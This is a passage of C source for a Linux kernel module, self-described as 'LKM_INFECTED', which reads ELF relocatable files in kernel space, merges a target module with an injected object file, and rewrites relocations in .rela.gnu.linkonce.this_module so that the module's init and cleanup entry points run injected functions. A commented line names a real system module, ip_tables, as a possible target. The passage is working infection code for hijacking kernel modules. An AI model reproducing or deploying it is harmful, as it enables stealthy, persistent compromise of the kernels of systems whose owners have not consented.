			if(!rsym) return cnt;
		       	memcpy(rsym, sym, sizeof(Elf64_Sym)); 
			return cnt;
	       	}
		cnt++;
	}
	return -1;
}
int lkm_elf_symtab(struct lkm_elf_struct *elf) {
	if(!elf) return -1;
	Elf64_Shdr shsymtable;

	if(lkm_elf_SectByName(elf, ".symtab", &shsymtable)<0) return -1;
	if(shsymtable.sh_entsize!=sizeof(Elf64_Sym)) return -1;
	elf->symtab = lkm_elf_SectRead(elf, &shsymtable, &elf->symtab_len);
	if(!elf->symtab) return -1;
	return 0;
}
int lkm_elf_strtab(struct lkm_elf_struct *elf) {
	if(!elf) return -1;
	Elf64_Shdr strtable;

	if(lkm_elf_SectByName(elf, ".strtab", &strtable)<0) return -1;
	elf->strtab = lkm_elf_SectRead(elf, &strtable, &elf->strtab_len);
	if(!elf->strtab) return -1;
	return 0;
}
int lkm_elf_shtab(struct lkm_elf_struct *elf) {
	if(!elf || !elf->fd ||(elf->head.e_shentsize!=sizeof(Elf64_Shdr))) return -1;

	struct file *fd = elf->fd;
	int a = elf->head.e_shnum * elf->head.e_shentsize;
	elf->shtab = kmalloc(a, GFP_KERNEL);
	if(!elf->shtab) return -1;
	fd->f_pos = elf->head.e_shoff;
	if (lkm_file_read(fd, elf->shtab, a, &fd->f_pos) < 1) {printk(KERN_INFO "FAIL: file read\n"); kfree(elf->shtab); return -1;}
	elf->shtab_len = a;
	return 0;
}
struct lkm_elf_struct *lkm_elf_init(char *path) {
	int a;
	char class;
	short type;
	struct file *fd;
	long size;
	
	struct lkm_elf_struct *elf = kmalloc(sizeof(struct lkm_elf_struct), GFP_KERNEL);
	if(!elf) {
		printk(KERN_INFO "ERROR: kmalloc memory for Elf_Binary_t\n");
		return NULL;
	}
	memset(elf, 0, sizeof(struct lkm_elf_struct));
	fd = lkm_file_open(path);
    	if(!fd) {
    		printk(KERN_INFO "ERROR: file open\n");
		kfree(elf);
    		return NULL;
    	}
	struct kstat stat;
	lkm_file_stat(path, &stat);
	size = stat.size;

	a = lkm_file_read(fd, &elf->head, sizeof(Elf64_Ehdr), &fd->f_pos);
    	if(a==-1) {
    		printk(KERN_INFO "ERROR: file read\n");
    		lkm_elf_close(elf);
    		return NULL;
    	}

	if( (*(int*)&elf->head != 0x464C457F) ||  (elf->head.e_machine!=(Elf64_Half)EM_X86_64) ) {
    		printk(KERN_INFO "ERROR: file isn't Elf AMD64/INTELx86\n");
    		lkm_elf_close(elf);
    		return NULL;
    	}

	type =  elf->head.e_type;
	if(type!=ET_REL) {
    		printk(KERN_INFO "ERROR: file type not ET_REL\n");
		lkm_elf_close(elf);
		return NULL;
	}
		
	class = elf->head.e_ident[4];
	elf->fd = fd;
	elf->name = path;
	elf->class = class;
	elf->type  = type;
	elf->file_size = size;
	if(class==ELFCLASS64) {
		if(lkm_elf_shtab(elf)) {
			printk(KERN_INFO "ERROR: get shtable\n");
			lkm_elf_close(elf);
			return NULL;
		}
		if(lkm_elf_shstrtab(elf)) {
			printk(KERN_INFO "ERROR: get shstrtable\n");
			lkm_elf_close(elf);
			return NULL;
		}
		if(lkm_elf_symtab(elf)) {
			printk(KERN_INFO "ERROR: get symtable\n");
			lkm_elf_close(elf);
			return NULL;
		}
		if(lkm_elf_strtab(elf)) {
			printk(KERN_INFO "ERROR: get strtable\n");
			lkm_elf_close(elf);
			return NULL;
		}
	}
	else { 
    		printk(KERN_INFO "ERROR: file class isn't ELF64\n");
		lkm_elf_close(elf);
		return NULL;
	}
	return elf;
}

void lkm_elf_close(struct lkm_elf_struct *elf) {
	if(!elf) return;
	if(elf->fd) { lkm_file_close(elf->fd); elf->fd = NULL; }	
	if(elf->shtab) { kfree(elf->shtab); elf->shtab = NULL; }
	if(elf->strtab) { kfree(elf->strtab); elf->strtab = NULL; }
	if(elf->symtab) { kfree(elf->symtab); elf->symtab = NULL; }
	if(elf->shstrtab) { kfree(elf->shstrtab); elf->shstrtab = NULL; }
	if(elf->sym_comm) { kfree(elf->sym_comm); elf->sym_comm = NULL; }
	if(elf->sect_comm) { kfree(elf->sect_comm); elf->sect_comm = NULL; }
	kfree(elf);
	return;
}

int test(void) {
	char *fname = "/om4/tests/lkm_inject/zzz.ko";
	char *file1 = "/om4/tests/lkm_inject/mod.ko";
	//char *file1 = "/lib/modules/6.11.2-amd64/kernel/net/ipv4/netfilter/ip_tables.ko.xz";
	char *file2 = "/om4/tests/lkm_inject/test.o";
	struct lkm_elf_struct *lkm_elf1 = NULL;
	struct lkm_elf_struct *lkm_elf2 = NULL;

   	lkm_elf1 =  lkm_elf_init(file1);
	if(!lkm_elf1) {
	       	printk(KERN_INFO "ERROR: read file %s\n", file1);
		return -1;
	}
   	lkm_elf2 =  lkm_elf_init(file2);
	if(!lkm_elf2){
		printk(KERN_INFO "ERROR: read file %s\n", file2);
		lkm_elf_close(lkm_elf1);
		return -1;

	}
	lkm_elf_MakeFile(lkm_elf1, lkm_elf2, fname);
	lkm_elf_close(lkm_elf1);
	lkm_elf_close(lkm_elf2);

	lkm_elf1 = lkm_elf_init(fname);
	if(!lkm_elf1) {
	       	printk(KERN_INFO "ERROR: read file %s\n", fname);
		return -1;
	}
	lkm_elf_InfectRela(lkm_elf1, ".rela.gnu.linkonce.this_module", "init_module", "inje_module");
	lkm_elf_InfectRela(lkm_elf1, ".rela.gnu.linkonce.this_module", "cleanup_module", "cnje_module");
	lkm_elf_close(lkm_elf1);
	return 0;
}

static int __init mod_init(void) {
   printk(KERN_INFO "------------ START: ---------------\n");
   test();
   return 0;
}
static void __exit mod_exit(void) {

   	printk(KERN_INFO "------------ END. -----------------");
	return;
}
module_init(mod_init);
module_exit(mod_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("PARFIK");
MODULE_DESCRIPTION("LKM_INFECTED .ko...");
MODULE_VERSION("1.0");
